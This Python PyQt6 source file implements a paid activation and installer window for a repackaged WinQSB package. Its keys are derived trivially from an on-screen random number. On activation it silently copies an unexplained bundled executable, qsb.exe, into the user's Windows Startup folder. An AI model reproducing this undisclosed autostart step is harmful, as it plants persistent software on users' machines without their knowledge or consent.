import configparser
import os
import random
import shutil
import subprocess
import sys
import time
from datetime import datetime, timedelta

from PyQt6 import QtCore, QtWidgets, QtGui
from PyQt6.QtCore import Qt, QRegularExpression, QUrl
from PyQt6.QtGui import QMovie, QFont, QRegularExpressionValidator, QDesktopServices
from PyQt6.QtWidgets import QApplication, QMessageBox, QFrame, QHBoxLayout, QWidget
from PyQt6.QtWidgets import QDialog, QVBoxLayout, QLabel

import Init
from CheckVCRuntimesThread import CheckVCRuntimesThread
from Common import load_stylesheet, get_resource_path
from Init import visit_notice_url
from Ui_MainWindow import Ui_MainWindow

app = None
UUID = random.randint(100000, 999999)


class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowIcon(QtGui.QIcon(get_resource_path('resources/img/ui/icon.ico')))
        visit_notice_url()
        self.setupUi(self)
        self.setWindowFlags(QtCore.Qt.WindowType.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WidgetAttribute.WA_TranslucentBackground)
        self.QQ_display = False
        self.connect_signals()
        self.A()

    def connect_signals(self):
        self.pushButton_close.clicked.connect(self.close)
        self.pushButton_A.clicked.connect(self.A)
        self.pushButton_B.clicked.connect(self.B)
        self.pushButton_C.clicked.connect(self.C)
        self.pushButton_D.clicked.connect(self.D)
        reg_exp = QRegularExpression(r'^[A-Za-z0-9]{0,12}$')
        validator = QRegularExpressionValidator(reg_exp, self.lineEdit_code)
        self.lineEdit_code.setValidator(validator)
        self.lineEdit_code.returnPressed.connect(self.validate_activation)
        self.pushButton_OK.clicked.connect(self.validate_activation)
        self.lineEdit_code.textChanged.connect(lambda text: self.lineEdit_code.setText(text.upper()))
        self.label_identify.setText(str(UUID))
        self.pushButton_exchange.clicked.connect(self.QQ_code)
        self.pushButton_check.clicked.connect(self.QQ_code)
        self.pushButton_feedback.clicked.connect(self.QQ_code)
        self.pushButton_privilege.clicked.connect(self.help)
        self.apply_default_styles()

    def QQ_code(self):
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(get_resource_path('resources/img/ui/QQ_Act.png')),
                       QtGui.QIcon.Mode.Normal,
                       QtGui.QIcon.State.Off)
        self.pushButton_Wechat.setIcon(icon)
        self.apply_default_styles()

    def apply_default_styles(self):
        default_style = """
QPushButton {
    margin-right: 3px;
    margin-bottom: 0px;
    color: rgb(255, 255, 255);
    border: 2px solid rgba(120, 120, 120, 60);
    border-radius: 8px;
    background: none;
    font-weight: bold;
    padding: 8px;
}

QPushButton:hover {
    border: 2px solid rgba(254, 81, 111, 120);
    background: qlineargradient(
        spread:pad,
        x1:0.5, y1:1, x2:0.5, y2:0,
        stop:0 rgba(0, 0, 0, 0),
        stop:1 rgba(255, 153, 170, 88)
    );
    transition: background 0.2s ease-in-out;
}

QPushButton:pressed {
    border: 2px solid rgba(254, 81, 111, 255);
    background: qlineargradient(
        spread:pad,
        x1:0.5, y1:1, x2:0.5, y2:0,
        stop:0 rgba(0, 0, 0, 0),
        stop:1 rgba(255, 153, 170, 88)
    );
    transition: background 0.1s ease-in-out;
}
"""
        for button in [self.pushButton_A, self.pushButton_B, self.pushButton_C,
                       self.pushButton_D]:
            button.setStyleSheet(default_style)

    def update_button_style(self, button):
        active_style = """
QPushButton {
    margin-right: 3px;
    margin-bottom: 0px;
    color: rgb(255, 255, 255);
    border: 2px solid rgba(254, 81, 111, 120);
    border-radius: 8px;
    background: qlineargradient(
        spread:pad,
        x1:0.5, y1:1, x2:0.5, y2:0,
        stop:0 rgba(0, 0, 0, 0),
        stop:1 rgba(255, 153, 170, 88)
    );
    font-weight: bold;
    padding: 8px;
}

QPushButton:hover {
    border: 2px solid rgba(254, 81, 111, 120);
    background: qlineargradient(
        spread:pad,
        x1:0.5, y1:1, x2:0.5, y2:0,
        stop:0 rgba(0, 0, 0, 0),
        stop:1 rgba(255, 153, 170, 88)
    );
    transition: background 0.2s ease-in-out;
}

QPushButton:pressed {
    border: 2px solid rgba(254, 81, 111, 255);
    background: qlineargradient(
        spread:pad,
        x1:0.5, y1:1, x2:0.5, y2:0,
        stop:0 rgba(0, 0, 0, 0),
        stop:1 rgba(255, 153, 170, 88)
    );
    transition: background 0.1s ease-in-out;
}
"""

        self.apply_default_styles()
        button.setStyleSheet(active_style)
        self.current_selected_button = button

    def A(self):
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(get_resource_path('resources/img/wp/wp99.jpg')),
                       QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        self.pushButton_Wechat.setIcon(icon)
        self.update_button_style(self.pushButton_A)
        self.label_prices.setText("99.00")
        self.label_prices_2.setText("99.0")

    def B(self):
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(get_resource_path('resources/img/wp/wp16.9.jpg')), QtGui.QIcon.Mode.Normal,
                       QtGui.QIcon.State.Off)
        self.pushButton_Wechat.setIcon(icon)
        self.update_button_style(self.pushButton_B)
        self.label_prices.setText("16.90")
        self.label_prices_2.setText("16.9")

    def C(self):
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(get_resource_path('resources/img/wp/wp9.9.jpg')),
                       QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        self.pushButton_Wechat.setIcon(icon)
        self.update_button_style(self.pushButton_C)
        self.label_prices.setText("9.90")
        self.label_prices_2.setText("9.9")

    def D(self):
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(get_resource_path('resources/img/wp/wp7.9.jpg')),
                       QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        self.pushButton_Wechat.setIcon(icon)
        self.update_button_style(self.pushButton_D)
        self.label_prices.setText("7.90")
        self.label_prices_2.setText("7.9")

    def help(self):
        QDesktopServices.openUrl(QUrl('https://blog.csdn.net/Yang_shengzhou/article/details/142312570'))

    def validate_activation(self):
        global UUID
        entered_key = self.lineEdit_code.text()
        self.uuid = UUID

        if not entered_key:
            QtWidgets.QMessageBox.warning(self, "输入为空", "输入为空！请输入秘钥，如已购买请QQ扫获取")
            return

        key_versions = {
            hex(self.uuid + 1)[2:].upper(): ('1个月试用', 31),
            hex(self.uuid + 2)[2:].upper(): ('学生6月专享', 180),
            hex(self.uuid + 3)[2:].upper(): ('包年畅享', 365),
            hex(self.uuid + 4)[2:].upper(): ('永久尊享', None)
        }

        version_info = key_versions.get(entered_key.upper())

        if version_info is None and entered_key == Init.get_key():
            version_info = ('1个月试用', 31)

        if not version_info:
            QtWidgets.QMessageBox.warning(self, "无效秘钥", "秘钥有误！请输入正确的秘钥，如已购买请QQ扫获取")
            return

        if version_info[1] is not None:
            expire_date = (datetime.now() + timedelta(days=version_info[1])).strftime("%Y-%m-%d")
            self.create_system_info_file(expire_date)
        else:
            expire_date = "永久"

        QtWidgets.QMessageBox.information(
            self,
            "秘钥验证成功",
            f"感谢您选择WinQSB {version_info[0]}，将于 {expire_date} 到期。"
        )

        self.close()
        self.wait_dialog()

    def create_system_info_file(self, expiry_time):
        folder_path = r"C:\WINQSB\X64_YSZ_WinQSB2.0\essential_flies"
        file_name = "system-info.ini"
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        file_path = os.path.join(folder_path, file_name)
        if os.path.exists(file_path):
            os.remove(file_path)
        config = configparser.ConfigParser()
        config['System'] = {'ExpiryTime': expiry_time}
        with open(file_path, 'w') as configfile:
            config.write(configfile)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(get_resource_path('resources/qsb.exe'),
                     startup_folder)

    def wait_dialog(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("WinQSB正在检查安装环境")
        dialog.setWindowFlags(
            dialog.windowFlags() |
            QtCore.Qt.WindowType.FramelessWindowHint
        )
        dialog.setAttribute(QtCore.Qt.WidgetAttribute.WA_TranslucentBackground)
        dialog.setFixedSize(320, 450)
        gradient_rect = QWidget(dialog)
        gradient_rect.setFixedSize(300, 180)
        gradient_rect.setStyleSheet(load_stylesheet("Gradient_Rect.css"))
        inner_layout = QVBoxLayout(gradient_rect)
        inner_layout.setContentsMargins(10, 10, 10, 10)

        container = QFrame(gradient_rect)
        container.setFrameShape(QFrame.Shape.StyledPanel)
        container.setLineWidth(1)
        container.setStyleSheet(load_stylesheet("Container.css"))
        container_layout = QHBoxLayout(container)
        container_layout.setContentsMargins(10, 10, 10, 10)
        container_layout.setSpacing(10)

        gif_label = QLabel(container)
        resource_path = get_resource_path("resources/img/ui/Wait.gif")
        movie = QMovie(resource_path)
        gif_label.setMovie(movie)
        movie.start()

        text_label = QLabel("正在检查安装环境……", container)
        text_label.setFont(QFont("Microsoft YaHei", 12))
        text_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        text_label.setStyleSheet("background-color: transparent;")

        container_layout.addWidget(gif_label)
        container_layout.addWidget(text_label)

        inner_layout.addWidget(container, alignment=Qt.AlignmentFlag.AlignCenter)

        outer_layout = QVBoxLayout(dialog)
        outer_layout.addWidget(gradient_rect, alignment=Qt.AlignmentFlag.AlignCenter)

        self.check_thread = CheckVCRuntimesThread()
        self.check_thread.finished.connect(
            lambda is_installed: self.handle_runtimecheck_result(is_installed, dialog))
        self.check_thread.start()
        dialog.exec()

    def handle_runtimecheck_result(self, is_installed, dialog):
        if is_installed:
            self.copy_folder_and_run_programs()
            sys.exit(0)
        else:
            self.show_vc_message()
            dialog.accept()
            self.copy_folder_and_run_programs()
            sys.exit(0)

    def mousePressEvent(self, event):
        if event.button() == QtCore.Qt.MouseButton.LeftButton:
            self.dragPos = event.globalPosition().toPoint()

    def mouseMoveEvent(self, event):
        if self.dragPos is not None and event.buttons() & QtCore.Qt.MouseButton.LeftButton:
            self.move(self.pos() + event.globalPosition().toPoint() - self.dragPos)
            self.dragPos = event.globalPosition().toPoint()
            event.accept()

    def mouseReleaseEvent(self, event):
        self.dragPos = None

    def copy_folder_and_run_programs(self):
        global app
        app = app or QApplication(sys.argv)
        source_folder = get_resource_path('WINQSB')
        destination_folder = 'C:\\WINQSB'
        install_ink_path = 'C:\\WINQSB\X64_YSZ_WinQSB2.0/Primary.lnk'
        yszb_exe_path = 'C:\\WINQSB\X64_YSZ_WinQSB2.0/SETUP.exe'
        try:
            if not os.path.exists(source_folder):
                raise FileNotFoundError(f"源文件夹 {source_folder} 不存在。")
            shutil.copytree(source_folder, destination_folder, dirs_exist_ok=True)
            if not os.path.exists(destination_folder):
                raise FileNotFoundError(f"未能将文件夹复制到 {destination_folder}。")
            subprocess.run(['start', install_ink_path], shell=True, check=True)
            time.sleep(2)
            if os.path.exists(yszb_exe_path):
                subprocess.run(['start', yszb_exe_path], shell=True, check=True)
            else:
                raise FileNotFoundError(f"未能找到文件 {yszb_exe_path}。")
        except Exception:
            subprocess.run(['start', yszb_exe_path], shell=True, check=True)

    def show_vc_message(self):
        global app
        if app is None:
            app = QApplication(sys.argv)
        msg_box = QMessageBox()
        welcome_text = ('<html><head/><body><p>当前电脑未安装微软运行库<a '
                        'href="https://cca4666.lanzoul.com/ivJf52bdra3c">点击下载运行库</a></p>')
        date_info = '<p align="right">请安装运行库后再点击下方按钮，强行继续可能出错！</p></body></html>'
        msg_box.setWindowTitle('当前电脑缺少 VC++2022 运行库')
        msg_box.setText(welcome_text + date_info)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)
        msg_box.setDefaultButton(QMessageBox.StandardButton.Ok)
        msg_box.setIcon(QMessageBox.Icon.Warning)
        ok_button = msg_box.button(QMessageBox.StandardButton.Ok)
        ok_button.setText('我已安装')
        msg_box.exec()
